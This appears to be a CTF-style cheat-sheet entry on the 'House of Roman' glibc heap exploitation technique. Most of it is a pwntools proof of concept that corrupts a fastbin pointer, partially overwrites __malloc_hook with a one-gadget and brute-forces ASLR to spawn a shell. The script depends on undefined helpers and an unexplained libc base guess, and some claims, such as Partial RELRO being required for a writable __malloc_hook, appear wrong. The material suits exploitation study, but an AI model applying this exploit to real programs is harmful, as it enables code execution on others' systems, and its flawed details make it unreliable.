# House of Roman

**When**: No leak available. PIE off, Partial RELRO. Have relative heap overflow or UAF. glibc < 2.29 (pre-tcache-key).
**Primitive needed**: Fastbin or tcache corruption + partial overwrite.
**Result**: Code execution via partial overwrite chain — no leaks required.

## Mechanism
1. Use fastbin dup to get an allocation overlapping `__malloc_hook`.
2. Partial-overwrite `__malloc_hook` to point to a one-gadget.
3. Since ASLR randomizes only the upper bytes, the lower 12 bits of libc
   addresses are fixed. Overwrite only 2-3 bytes of `__malloc_hook` with
   the low bytes of the one-gadget → 4-bit brute-force (1/16 chance).

## PoC
```python
# IN: fastbin-size overflow, no leak  OUT: shell (probabilistic, ~1/16)
from pwn import *

context.binary = elf = ELF('./binary')

def exploit():
    p = process('./binary')

    # Step 1: Create overlapping fastbin chunks
    alloc(0, 0x68)   # chunk A (fastbin size)
    alloc(1, 0x68)   # chunk B
    alloc(2, 0x68)   # chunk C
    alloc(3, 0x10)   # guard

    # Step 2: Free B, overflow from A to corrupt B's fd → point near __malloc_hook
    free(1)
    # __malloc_hook is at libc + offset, near __memalign_hook
    # __malloc_hook - 0x23 has a 0x7f byte that looks like a valid fastbin size
    malloc_hook_fake_chunk = libc_base_guess + libc.sym['__malloc_hook'] - 0x23
    # Partial overwrite: only write low 3 bytes of the fd
    edit(0, b'A' * 0x68 + p64(0x71) + p32(malloc_hook_fake_chunk & 0xFFFFFFFF))

    # Step 3: Fastbin chain: B → fake_chunk_near_hook
    alloc(4, 0x68)   # returns B
    alloc(5, 0x68)   # returns fake chunk overlapping __malloc_hook

    # Step 4: Overwrite __malloc_hook with one-gadget (partial, low bytes only)
    # One-gadget low bytes: e.g., 0x4526a → write \x6a\x52\x04
    payload = b'\x00' * (0x23 - 0x10)  # padding to __malloc_hook
    payload += p32(one_gadget_low_bytes)[:3]  # 3-byte partial overwrite
    edit(5, payload)

    # Step 5: Trigger malloc → __malloc_hook → one-gadget
    try:
        alloc(6, 0x10)
        p.sendline(b'id')
        p.recvline(timeout=1)
        p.interactive()
    except:
        p.close()

# Brute-force the 4-bit ASLR entropy
for attempt in range(100):
    try:
        exploit()
        break
    except:
        continue
```

## Trap
- Only works with Partial RELRO (need writable `__malloc_hook`).
- glibc 2.34+ removed `__malloc_hook` — use House of Apple/Banana instead.
- The brute-force loop is essential — expect ~16 attempts on average.
- The "0x7f" fake size near `__malloc_hook` is at a fixed offset: `__malloc_hook - 0x23` on most glibc versions (check with `find_fake_fast` in pwndbg).
